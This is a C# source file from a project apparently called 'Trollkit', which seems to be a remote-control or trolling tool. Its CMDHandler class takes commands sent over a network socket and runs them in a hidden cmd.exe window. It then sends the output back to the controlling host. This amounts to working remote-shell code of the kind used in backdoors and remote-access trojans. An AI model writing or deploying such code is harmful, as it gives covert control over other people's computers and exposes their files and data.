using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Trollkit_Library;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;

namespace Trollkit_Client.Modules.CommandHandlers
{
	public class CMDHandler : ICommandHandler
	{
		Process p;
		private StreamWriter Writer { get { return p.StandardInput; } }

		private List<string> CMDLineBuffer;

		public CMDHandler()
		{
			CMDLineBuffer = new List<string>();
		}


		public override bool HandleCommand(Socket s, TransferCommandObject obj)
		{
			switch (obj.Command)
			{
				case "ExecuteCMD":
					return ExecuteCommand(s, obj.Value);
				case "StopCMD":
					StopProcess();
					return true;
			}
			return false;
		}


		private void StartOrCreateProcess(Socket s)
		{
			if(p == null)
			{
				p = new Process();
				ProcessStartInfo startInfo = new ProcessStartInfo();
				startInfo.WindowStyle = ProcessWindowStyle.Hidden;
				startInfo.FileName = "cmd.exe";
				startInfo.UseShellExecute = false;
				startInfo.RedirectStandardOutput = true;
				startInfo.RedirectStandardInput = true;
				p.StartInfo = startInfo;
				p.Start();
				p.OutputDataReceived += P_OutputDataReceived;
				p.BeginOutputReadLine();			
			}

			if (p.HasExited)
			{
				p.Start();
			}
		}

		private void StopProcess()
		{
			if(p != null)
			{
				p.CancelOutputRead();
				p.Kill();
				p.Close();
			}
		}

		private void P_OutputDataReceived(object sender, DataReceivedEventArgs e)
		{
			CMDLineBuffer.Add(e.Data);
		}

		private void ReadBuffer(Socket s)
		{
			Thread.Sleep(300);
			if (CMDLineBuffer.Count != 0)
			{
				string appendedLines = "";

				foreach (string line in CMDLineBuffer)
					appendedLines += line + "\r\n";
				CMDLineBuffer.Clear();

				//write buffer to host
				TransferCommandObject responseCMDTransferObject = new TransferCommandObject { Command = "CMDResponse", Value = appendedLines };
				SendResponseObjectToSocket(s, ClientServerPipeline.BufferSerialize(responseCMDTransferObject));
				ReadBuffer(s);
			}
		}


		private bool ExecuteCommand(Socket s, string command)
		{
			try
			{
				StartOrCreateProcess(s);
				Writer.WriteLine(command);

				Task.Run(() => {
					ReadBuffer(s);
				});

				return true;
			}
			catch (Exception e)
			{
				BConsole.WriteLine("CMD Error: " + e.Message, ConsoleColor.Red);
				return false;
			}
		}
	}
}
